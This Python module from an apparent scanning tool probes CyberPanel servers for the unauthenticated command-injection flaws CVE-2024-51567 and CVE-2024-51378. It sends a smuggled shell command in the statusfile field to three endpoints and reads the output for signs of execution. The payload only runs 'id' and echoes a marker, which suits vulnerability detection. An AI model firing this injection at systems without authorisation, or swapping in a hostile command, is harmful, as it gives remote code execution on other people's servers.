"""
Raw execution for cyberpanel_rce_probe (CVE-2024-51567 & CVE-2024-51378).
Probes CyberPanel instances on standard ports (default 8090) for unauthenticated
command injection in /ftp/getresetstatus, /dns/getresetstatus, and
/dataBases/upGrademysqlStatus via crafted statusfile parameters in OPTIONS/POST
requests.
No parsing here -- parse.py's job.
"""
from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from typing import List, Optional
from urllib.parse import urlparse

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0"
PROBE_NONCE = "tradecraft_probe_cve_2024_51567"
PROBE_COMMAND = f"id; echo {PROBE_NONCE}"

CANDIDATE_ENDPOINTS = [
    "/ftp/getresetstatus",
    "/dns/getresetstatus",
    "/dataBases/upGrademysqlStatus",
]


@dataclass
class CyberPanelEndpointResult:
    base_url: str
    endpoint: str
    method: str
    status_code: Optional[int] = None
    output_snippet: str = ""
    is_vulnerable: bool = False
    error: Optional[str] = None


@dataclass
class RawCyberPanelResult:
    target: str = ""
    discovered_csrf_token: Optional[str] = None
    target_identified_as_cyberpanel: bool = False
    probes: List[CyberPanelEndpointResult] = field(default_factory=list)
    error: Optional[str] = None


def normalize_target_candidates(target: str) -> List[str]:
    t = target.strip()
    if not t:
        return []

    if "://" in t:
        parsed = urlparse(t)
        scheme = parsed.scheme or "https"
        netloc = parsed.netloc or parsed.path
        base = f"{scheme}://{netloc}".rstrip("/")
        # If user explicitly supplied a port or URL, probe that directly
        if parsed.port:
            return [base]
        return [f"{base}:8090", base]

    # Host or host:port without scheme
    if ":" in t:
        return [f"https://{t}", f"http://{t}"]

    # Bare hostname or IP: CyberPanel default is port 8090 (try https then http), then default 443/80
    return [
        f"https://{t}:8090",
        f"http://{t}:8090",
        f"https://{t}",
        f"http://{t}",
    ]


def execute(
    target: str,
    custom_port: Optional[int] = None,
    timeout: int = 8,
) -> RawCyberPanelResult:
    if requests is None:
        return RawCyberPanelResult(target=target, error="requests library not available")

    if not target or not target.strip():
        return RawCyberPanelResult(target="", error="target is required")

    candidates = normalize_target_candidates(target)
    if custom_port:
        host = target.split("://")[-1].split(":")[0].strip("/")
        candidates = [f"https://{host}:{custom_port}", f"http://{host}:{custom_port}"]

    result = RawCyberPanelResult(target=target.strip())
    session = requests.Session()
    session.headers.update({
        "User-Agent": USER_AGENT,
        "Accept": "application/json, text/html, */*",
    })

    working_base: Optional[str] = None
    csrf_token: Optional[str] = None

    # Step 1: Detect reachable CyberPanel base URL and retrieve CSRF token
    for base in candidates:
        try:
            r = session.get(f"{base}/", timeout=timeout, verify=False, allow_redirects=True)
            text_lower = r.text.lower()
            if "cyberpanel" in text_lower or "cyber panel" in text_lower or "statusfile" in text_lower:
                result.target_identified_as_cyberpanel = True

            token = session.cookies.get("csrftoken")
            if not token:
                match = re.search(r'name=["\']csrfmiddlewaretoken["\']\s+value=["\']([^"\']+)["\']', r.text)
                if match:
                    token = match.group(1)

            if token or r.status_code in (200, 302, 403, 401):
                working_base = base
                csrf_token = token
                break
        except requests.exceptions.RequestException:
            continue

    if not working_base:
        working_base = candidates[0]

    result.discovered_csrf_token = csrf_token
    token_val = csrf_token or "tradecraft_csrf_token"

    headers = {
        "X-CSRFToken": token_val,
        "Content-Type": "application/json",
        "Referer": f"{working_base}/",
    }
    payload = json.dumps({"statusfile": f"; {PROBE_COMMAND}; #"})

    # Step 2: Probe candidate endpoints with OPTIONS and POST
    for endpoint in CANDIDATE_ENDPOINTS:
        probe_url = f"{working_base}{endpoint}"
        for method in ("OPTIONS", "POST"):
            ep_res = CyberPanelEndpointResult(
                base_url=working_base,
                endpoint=endpoint,
                method=method,
            )
            try:
                resp = session.request(
                    method,
                    probe_url,
                    headers=headers,
                    data=payload,
                    timeout=timeout,
                    verify=False,
                )
                ep_res.status_code = resp.status_code
                body = resp.text[:2000] if resp.text else ""
                ep_res.output_snippet = body

                is_vuln = False
                if PROBE_NONCE in body or "uid=" in body or "gid=" in body:
                    is_vuln = True
                else:
                    try:
                        data = resp.json()
                        req_status = str(data.get("requestStatus", ""))
                        err_msg = str(data.get("error_message", ""))
                        if PROBE_NONCE in req_status or "uid=" in req_status or PROBE_NONCE in err_msg:
                            is_vuln = True
                            ep_res.output_snippet = req_status or err_msg
                    except Exception:
                        pass

                ep_res.is_vulnerable = is_vuln
            except requests.exceptions.RequestException as e:
                ep_res.error = str(e)

            result.probes.append(ep_res)
            if ep_res.is_vulnerable:
                break
        if any(p.is_vulnerable for p in result.probes):
            break

    return result
